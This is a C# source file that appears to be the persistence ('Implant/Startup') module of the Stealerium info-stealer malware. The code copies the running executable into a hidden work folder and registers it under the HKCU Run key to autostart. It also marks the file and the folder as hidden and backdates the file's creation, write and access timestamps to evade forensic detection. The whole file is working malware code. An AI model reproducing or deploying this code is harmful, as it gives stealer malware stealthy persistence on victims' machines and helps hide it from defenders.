using System;
using System.IO;
using Microsoft.Win32;
using Stealerium.Stub.Helpers;

namespace Stealerium.Stub.Modules.Implant
{
    internal sealed class Startup
    {
        // Install
        private static readonly string ExecutablePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        private static readonly string InstallDirectory = Paths.InitWorkDir();

        private static readonly string InstallFile = Path.Combine(
            InstallDirectory, new FileInfo(ExecutablePath).Name);

        // Autorun
        private const string StartupKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        private static readonly string StartupName = Path.GetFileNameWithoutExtension(ExecutablePath);

        // Ensure that the install directory exists
        public static void EnsureDirectoryExists(string path)
        {
            if (!Directory.Exists(path))
            {
                Logging.Log($"Directory does not exist, creating: {path}");
                Directory.CreateDirectory(path);  // Create the directory if it doesn't exist
            }
        }

        // Set or remove the hidden attribute for a file
        public static void SetFileHiddenAttribute(string path, bool hide = true)
        {
            var fileInfo = new FileInfo(path);
            if (fileInfo.Exists)
            {
                if (hide)
                {
                    Logging.Log("Adding 'hidden' attribute to file " + path);
                    fileInfo.Attributes |= FileAttributes.Hidden;
                }
                else
                {
                    Logging.Log("Removing 'hidden' attribute from file " + path);
                    fileInfo.Attributes &= ~FileAttributes.Hidden;
                }
            }
        }

        // Set or remove the hidden attribute for a folder
        public static void SetFolderHiddenAttribute(string folderPath, bool hide = true)
        {
            var dirInfo = new DirectoryInfo(folderPath);
            if (dirInfo.Exists)
            {
                if (hide)
                {
                    Logging.Log($"Setting 'hidden' attribute for folder: {folderPath}");
                    dirInfo.Attributes |= FileAttributes.Hidden;
                }
                else
                {
                    Logging.Log($"Removing 'hidden' attribute for folder: {folderPath}");
                    dirInfo.Attributes &= ~FileAttributes.Hidden;
                }
            }
        }

        // Change file creation date
        public static void SetFileCreationDate(string path = null)
        {
            var filename = path ?? ExecutablePath;
            Logging.Log("SetFileCreationDate : Changing file " + filename + " creation date");

            var time = new DateTime(DateTime.Now.Year - 2, 5, 22, 3, 16, 28);

            File.SetCreationTime(filename, time);
            File.SetLastWriteTime(filename, time);
            File.SetLastAccessTime(filename, time);
        }

        // Hide executable
        public static void HideFile(string path = null)
        {
            var filename = path ?? ExecutablePath;
            Logging.Log("HideFile : Adding 'hidden' attribute to file " + filename);
            new FileInfo(filename).Attributes |= FileAttributes.Hidden;
        }

        // Check if the app is installed to autorun
        public static bool IsInstalled()
        {
            var rkApp = Registry.CurrentUser.OpenSubKey(StartupKey, false);
            return rkApp?.GetValue(StartupName) != null && File.Exists(InstallFile);
        }

        // Install module to startup
        public static void Install()
        {
            try
            {
                Logging.Log("Startup : Adding to autorun...");

                // Ensure the install directory exists
                EnsureDirectoryExists(InstallDirectory);

                // Temporarily unhide the folder for the installation
                SetFolderHiddenAttribute(InstallDirectory, false);

                // Verify executable path and install file
                Logging.Log($"ExecutablePath: {ExecutablePath}");
                Logging.Log($"InstallFile: {InstallFile}");

                // Copy executable if it doesn't already exist
                if (!File.Exists(InstallFile))
                {
                    Logging.Log("Copying executable to install directory...");
                    File.Copy(ExecutablePath, InstallFile);
                }
                else
                {
                    Logging.Log("Executable already exists in install directory.");
                }

                // Open registry key with write access
                var rkApp = Registry.CurrentUser.OpenSubKey(StartupKey, true);
                if (rkApp != null)
                {
                    Logging.Log("Registry key opened successfully.");

                    // Check if value is already set
                    var existingValue = rkApp.GetValue(StartupName);
                    if (existingValue == null)
                    {
                        Logging.Log("Setting registry value for startup...");
                        rkApp.SetValue(StartupName, InstallFile);
                        Logging.Log("Registry value set successfully.");
                    }
                    else
                    {
                        Logging.Log($"Registry value already set: {existingValue}");
                    }
                }
                else
                {
                    Logging.Log("Failed to open registry key.");
                }

                // Restore hidden attribute for the folder after installation
                SetFolderHiddenAttribute(InstallDirectory, true);

                // Hide the executable and change creation date
                HideFile(InstallFile);
                SetFileCreationDate(InstallFile);
            }
            catch (Exception ex)
            {
                Logging.Log($"Error during installation: {ex.Message}");
            }
        }

        // Check if the executable is running from the startup directory
        public static bool IsFromStartup()
        {
            return ExecutablePath.StartsWith(InstallDirectory);
        }
    }
}
